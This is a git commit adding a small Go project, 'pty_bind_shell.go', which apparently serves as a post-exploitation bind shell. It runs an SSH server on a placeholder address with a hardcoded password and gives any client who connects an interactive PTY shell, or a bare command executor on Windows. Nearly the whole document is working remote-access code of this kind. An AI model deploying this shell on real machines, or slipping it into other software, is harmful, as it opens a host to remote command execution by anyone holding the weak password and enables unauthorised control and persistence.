698b690aae7fe75cdadf0c02a7f27a56c70108c1
whwlsfb <whwlsfb@wanghw.cn>
2021-05-26 14:34:51 +0800

    init

---
+++ go.mod
@@ -0,0 +1,11 @@
+module ptytest
+
+go 1.16
+
+require (
+	github.com/anmitsu/go-shlex v0.0.0-20200514113438-38f4b401e2be // indirect
+	github.com/creack/pty v1.1.12
+	github.com/gliderlabs/ssh v0.3.2
+	golang.org/x/crypto v0.0.0-20210513164829-c07d793c2f9a // indirect
+	golang.org/x/term v0.0.0-20210503060354-a79de5458b56
+)
---
+++ pty_bind_shell.go
@@ -0,0 +1,119 @@
+package main
+
+import (
+	"io"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"strings"
+
+	"github.com/creack/pty"
+	"github.com/gliderlabs/ssh"
+	"golang.org/x/term"
+)
+
+const (
+	PASSWORD = "password"
+	USERNAME = "xroot"
+)
+
+func simpleCommandShellHandler(s ssh.Session) {
+	term := term.NewTerminal(s, ">")
+	for {
+		line, err := term.ReadLine()
+		if err != nil {
+			break
+		}
+		in := strings.Split(line, " ")
+		if in[0] == "" {
+			continue
+		}
+		if in[0] == "exit" {
+			break
+		}
+		exe := exec.Command(in[0], in[1:]...)
+		out, err := exe.Output()
+		if err != nil {
+			term.Write([]byte(err.Error() + "\n"))
+		}
+		term.Write(out)
+	}
+}
+
+func requestUserInput(term *term.Terminal, requestText string, defaultVal string) (val string) {
+	_val := defaultVal
+	for {
+		term.Write([]byte(requestText))
+		line, err := term.ReadLine()
+		if err != nil {
+			break
+		}
+		if line == "" {
+			break
+		} else {
+			_val = line
+			break
+		}
+	}
+	return _val
+}
+
+func confirmShellConfig(s ssh.Session) (size pty.Winsize, shell string) {
+	term := term.NewTerminal(s, ">")
+	cols, _ := strconv.ParseUint(requestUserInput(term, "Please input winsize Cols [150]: \n", "150"), 10, 10)
+	rows, _ := strconv.ParseInt(requestUserInput(term, "Please input winsize Rows [70]: \n", "100"), 10, 10)
+	shellPath := requestUserInput(term, "Please input shell path [/bin/sh]: \n", "/bin/sh")
+	winsize := pty.Winsize{
+		Cols: uint16(cols),
+		Rows: uint16(rows),
+	}
+	return winsize, shellPath
+}
+
+func main() {
+	ssh.ListenAndServe("HOST:PORT", func(s ssh.Session) {
+		if runtime.GOOS == "windows" {
+			io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
+			simpleCommandShellHandler(s)
+		} else {
+			winsize, shell := confirmShellConfig(s)
+			c := exec.Command(shell)
+			_pty, _err := pty.StartWithSize(c, &winsize)
+			if _err != nil {
+				io.WriteString(s, "\n[-] Spwan pty failed, using simple command shell.\n")
+				simpleCommandShellHandler(s)
+			} else {
+
+				defer func() { _ = _pty.Close() }()
+				go func() {
+					for {
+						buffer := make([]byte, 1024)
+						length, _ := s.Read(buffer)
+						if length > 0 {
+							_pty.Write(buffer[:length])
+						} else {
+							_pty.Close()
+							c.Process.Kill()
+							break
+						}
+					}
+				}()
+				for {
+					buffer := make([]byte, 1024)
+					length, _ := _pty.Read(buffer)
+					if length > 0 {
+						s.Write(buffer[:length])
+					} else {
+						_pty.Close()
+						c.Process.Kill()
+						break
+					}
+				}
+			}
+		}
+	},
+		ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {
+			return pass == "SSHPASSWD"
+		}),
+	)
+}
